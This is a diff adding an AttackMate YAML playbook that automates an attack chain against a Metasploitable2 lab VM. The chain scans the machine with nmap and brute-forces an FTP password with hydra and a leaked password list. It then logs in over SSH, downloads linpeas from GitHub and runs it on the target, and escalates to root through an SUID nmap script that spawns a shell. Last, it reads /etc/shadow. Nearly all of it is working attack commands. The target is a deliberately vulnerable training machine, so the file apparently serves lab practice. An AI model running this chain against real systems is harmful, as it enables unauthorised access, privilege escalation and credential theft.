@@ -1,0 +1,102 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. scan the metasploitable-vm
+#     2. bruteforce a user
+#     3. login via ssh using the bruteforced pw
+#     4. upload linpeas and execute it
+#     5. find nmap suid and exploit it
+#     6. execute commands as root
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install nmap, hydra, wget and seclists
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 192.168.10.225
+  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+
+commands:
+  - type: shell
+    cmd: nmap -A -T4 $METASPLOITABLE
+
+  - type: shell
+    cmd: hydra -l user -P $PASSWDLIST $METASPLOITABLE ftp
+
+  # Parse the output of hydra and isolate the bruteforced password.
+  # The password will be stored in the variable $USERPW
+  - type: regex
+    cmd: ".*login: user.+password: (.+)"
+    output:
+      USERPW: "$MATCH_0"
+
+  # Print out the password
+  - type: debug
+    cmd: "Password found: $USERPW"
+
+  # Login via ssh using the bruteforced password
+  - type: ssh
+    cmd: id
+    username: user
+    password: "$USERPW"
+    hostname: $METASPLOITABLE
+    creates_session: "foothold"
+
+  # create a local tempfile for linpeas
+  - type: mktemp
+    variable: LINPEAS
+
+  # download linpeas locally
+  - type: shell
+    cmd: wget -O $LINPEAS https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+  # upload linpeas using the previously created ssh-session
+  - type: sftp
+    cmd: put
+    local_path: $LINPEAS
+    remote_path: /tmp/linpeas.sh
+    session: "foothold"
+    mode: 777
+
+  - type: debug
+    cmd: "Executing LinPeas. This will take a while. Please be patient"
+
+  # Execute linpeas in interactive mode. The command_timeout
+  # is set to 0 because linpeas runs very long without any
+  # output. AttackMate will run until the output of the commands
+  # ends with a prompt.
+  - type: ssh
+    cmd: "bash /tmp/linpeas.sh\n"
+    save: /tmp/linpeas_output.txt
+    exit_on_error: False
+    interactive: True
+    command_timeout: 0
+
+  # prepare the privilege escalation
+  - type: ssh
+    cmd: echo "os.execute('/bin/sh')" > somefile
+    session: foothold
+
+  # nmap has suid-permissions. we can escape by
+  # executing our payload as a script. We need
+  # an interactive shell so that we can run all
+  # further commands with root-permissions
+  - type: ssh
+    cmd: "nmap --script=./somefile localhost\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "id\n"
+    session: foothold
+    interactive: True
+
+  # proof that we have root permissions by
+  # reading out the shadow-file
+  - type: ssh
+    cmd: "grep root /etc/shadow\n"
+    session: foothold
+    interactive: True
